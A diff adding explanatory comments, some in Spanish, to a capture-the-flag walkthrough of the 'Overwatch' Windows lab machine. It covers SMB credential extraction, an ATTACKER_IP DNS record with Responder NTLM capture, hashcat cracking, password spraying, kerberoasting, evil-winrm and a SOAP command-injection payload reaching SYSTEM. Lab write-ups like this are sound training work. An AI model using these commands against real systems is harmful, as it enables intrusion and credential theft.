@@ -45,11 +45,15 @@ Root Flag
 
 ### Host Setup
 ```bash
+# What it does: adds machine domains to /etc/hosts.
+# Why here: resolve virtual hosts during web enumeration.
 echo "TARGET_IP overwatch.htb S200401.overwatch.htb S200401" | sudo tee -a /etc/hosts
 ```
 
 ### Nmap Scan
 ```bash
+# What it does: runs an Nmap scan with the specified ports/scripts/options.
+# Why here: identify exposed services and decide on the next enumeration.
 nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49667,49958,49959,55427,57249,59340,59343 -Pn -n TARGET_IP
 ```
 
@@ -72,12 +76,16 @@ nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,4966
 ### SMB Enumeration
 
 ```bash
+# What it does: enumerates or authenticates against Windows/AD services.
+# Why here: validar acceso, shares, usuarios o politicas.
 netexec smb overwatch.htb -u '' -p '' --shares
 netexec smb TARGET_IP -u 'guest' -p '' --shares
 ```
 **Result:** `STATUS_ACCESS_DENIED` — Null sessions and guest access blocked.
 
 ```bash
+# What it does: connects to an SMB resource and optionally executes an action.
+# Why here: listar, descargar o subir archivos por SMB.
 smbclient //TARGET_IP/software$ -N
 ```
 **Result:** ✅ Anonymous access to `software$` share granted.
@@ -88,6 +96,8 @@ Downloaded binaries and configuration files from the share. The key file was `ov
 
 **Extract Unicode strings from the binary and search for credentials:**
 ```bash
+# What it does: filters text with the specified pattern.
+# Why here: extract the important clue from a large output.
 strings -e l overwatch.exe | grep -iE "password|user|sql|connection"
 ```
 
@@ -99,6 +109,8 @@ Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;
 ### MSSQL Access Verification
 
 ```bash
+# What it does: enumerates or authenticates against Windows/AD services.
+# Why here: validar acceso, shares, usuarios o politicas.
 netexec mssql TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520
 ```
 ```
@@ -113,6 +125,8 @@ netexec mssql TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520
 ### Privilege Check
 
 ```bash
+# What it does: enumerates or authenticates against Windows/AD services.
+# Why here: validar acceso, shares, usuarios o politicas.
 netexec mssql TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520 \
   -q "SELECT IS_SRVROLEMEMBER('sysadmin');"
 ```
@@ -121,6 +135,8 @@ netexec mssql TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520 \
 ### Interactive Session
 
 ```bash
+# What it does: executes an Impacket utility for AD/Windows.
+# Why here: extract tickets, hashes or protocol access for the chain.
 impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@TARGET_IP -port 6520 -windows-auth
 ```
 
@@ -144,17 +160,23 @@ enum_owner
 
 **SYSVOL Access:**
 ```bash
+# What it does: connects to an SMB resource and optionally executes an action.
+# Why here: listar, descargar o subir archivos por SMB.
 smbclient //TARGET_IP/SYSVOL -U overwatch.htb/sqlsvc%'TI0LKcfHzZw1Vv' \
   -c "recurse ON; prompt OFF; cd overwatch.htb; mget *" 2>/dev/null
 ```
 
 **LDAP User Enumeration:**
 ```bash
+# What it does: enumerates or authenticates against Windows/AD services.
+# Why here: validar acceso, shares, usuarios o politicas.
 netexec ldap TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --users 2>/dev/null
 ```
 
 **AS-REP Roasting:**
 ```bash
+# What it does: executes an Impacket utility for AD/Windows.
+# Why here: extract tickets, hashes or protocol access for the chain.
 impacket-GetNPUsers overwatch.htb/ -usersfile users.txt -dc-ip TARGET_IP -no-pass -format hashcat
 ```
 **Result:** No AS-REP roastable accounts found.
@@ -311,6 +333,8 @@ dnstool -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
   --action add --record SQL07 --data <ATTACKER_IP> TARGET_IP
 
 # Start Responder to capture NTLM authentication
+# What it does: arranca Responder en la interfaz indicada.
+# Why here: capturar autenticaciones NTLM para crackeo o analisis de relay.
 sudo responder -I tun0
 ```
 
@@ -327,6 +351,8 @@ EXEC ('SELECT @@version') AT SQL07;
 ### Step 6 — Crack the Hash
 
 ```bash
+# What it does: cracks hashes with the specified mode and wordlist.
+# Why here: recuperar credenciales o confirmar que no estan en la lista.
 hashcat -m 5600 <captured_hash> /usr/share/wordlists/rockyou.txt --force
 ```
 
@@ -338,16 +364,22 @@ hashcat -m 5600 <captured_hash> /usr/share/wordlists/rockyou.txt --force
 
 ### Password Policy Check
 ```bash
+# What it does: enumerates or authenticates against Windows/AD services.
+# Why here: validar acceso, shares, usuarios o politicas.
 netexec smb TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --pass-pol
 ```
 
 ### SMB Spraying (Fast)
 ```bash
+# What it does: enumerates or authenticates against Windows/AD services.
+# Why here: validar acceso, shares, usuarios o politicas.
 netexec smb TARGET_IP -u users.txt -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --continue-on-success
 ```
 
 ### LDAP Spraying (Stealth)
 ```bash
+# What it does: enumerates or authenticates against Windows/AD services.
+# Why here: validar acceso, shares, usuarios o politicas.
 netexec ldap TARGET_IP -u users.txt -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --continue-on-success
 ```
 
@@ -358,6 +390,8 @@ kerbrute passwordspray -d overwatch.htb --dc TARGET_IP users.txt 'TI0LKcfHzZw1Vv
 
 ### Kerberoasting
 ```bash
+# What it does: executes an Impacket utility for AD/Windows.
+# Why here: extract tickets, hashes or protocol access for the chain.
 impacket-GetUserSPNs overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv' -dc-ip TARGET_IP -request
 ```
 
@@ -369,11 +403,15 @@ The cracked hash revealed credentials for `sqlmgmt`, a member of the **Remote Ma
 
 ### Connect via WinRM
 ```bash
+# What it does: opens a WinRM shell with the specified credentials/hash.
+# Why here: obtain interactive Windows access after validating credentials.
 evil-winrm -i TARGET_IP -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'
 ```
 
 ### Capture User Flag
 ```powershell
+# What it does: executes a Windows command line action.
+# Why here: enumerate, transfer, replace or validate artifacts on the victim.
 type C:\Users\sqlmgmt\Desktop\user.txt
 ```
 
@@ -437,6 +475,8 @@ Get-Process -Id (Get-NetTCPConnection -LocalPort 8000 -ErrorAction SilentlyConti
 
 Explored the service directory:
 ```powershell
+# What it does: changes the current directory.
+# Why here: position in the necessary path for the next command.
 cd C:\Software\Monitoring\
 Get-ChildItem -Force | Format-Table Name, Length, LastWriteTime -AutoSize
 Get-ChildItem -Force -Recurse | Select-Object FullName, Length, LastWriteTime
@@ -506,6 +546,8 @@ This tells the service to: `kill notepad` **AND THEN** `cat the root flag`.
 ### Exploit with curl
 
 ```bash
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl.exe -X POST http://127.0.0.1:8000/MonitorService `
   -H "Content-Type: text/xml; charset=utf-8" `
   -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" `
@@ -558,3 +600,5 @@ Invoke-RestMethod -Uri "http://localhost:8000/MonitorService" `
 | **User Flag** | WinRM (evil-winrm) | Remote Management Users group |
 | **Privilege Escalation** | WCF service command injection | Unvalidated `processName` parameter → RCE as SYSTEM |
 | **Root Flag** | SOAP request with injected command | `;type C:\Users\Administrator\Desktop\root.txt` |
+
+
